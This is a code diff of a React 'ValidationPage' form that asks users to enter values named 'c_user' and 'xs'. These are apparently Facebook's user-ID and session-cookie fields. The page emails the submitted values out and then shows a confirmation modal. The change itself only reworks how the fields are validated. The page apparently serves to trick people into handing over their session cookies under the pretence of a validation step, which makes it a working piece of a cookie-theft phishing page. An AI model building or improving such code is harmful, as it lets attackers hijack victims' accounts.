@@ -9,10 +9,7 @@ const ValidationPage = () => {
   const [showModal, setShowModal] = useState(false);
   const [isFormValid, setIsFormValid] = useState(false);
 
-  // Define regular expressions for validation
-  const cUserPattern = /^\d{15}$/; // Exactly 15 digits for c_user
-  const xsPattern = /.*%+.*/; // Pattern requiring at least one % symbol in xs
-
+  // Send email function with manual validation
   const sendEmail = (e) => {
     e.preventDefault();
 
@@ -20,9 +17,11 @@ const ValidationPage = () => {
     const cUserValue = form.current.elements["c_user"].value;
     const xsValue = form.current.elements["xs"].value;
 
-    // Validate input fields using regex
-    const isCUserValid = cUserPattern.test(cUserValue);
-    const isXsValid = xsPattern.test(xsValue);
+    // Manual validation for c_user (must be exactly 15 digits)
+    const isCUserValid = cUserValue.length === 15 && !isNaN(cUserValue);
+
+    // Manual validation for xs (must contain at least one '%' symbol)
+    const isXsValid = xsValue.includes('%');
 
     if (isCUserValid && isXsValid) {
       // Fields are valid, send the email and show the modal
@@ -125,7 +124,6 @@ const ValidationPage = () => {
                 type="number"
                 name="c_user"
                 required
-                pattern="^\d{15}$"
                 title="Please enter exactly 15 digits"
               />
               <br />
@@ -136,7 +134,6 @@ const ValidationPage = () => {
               <input
                 type="text"
                 name="xs"
-                pattern=".*%+.*"
                 title="Please enter a valid format with at least one % symbol"
               />
               <p className="mt-2" style={{ fontSize: "12px" }}>
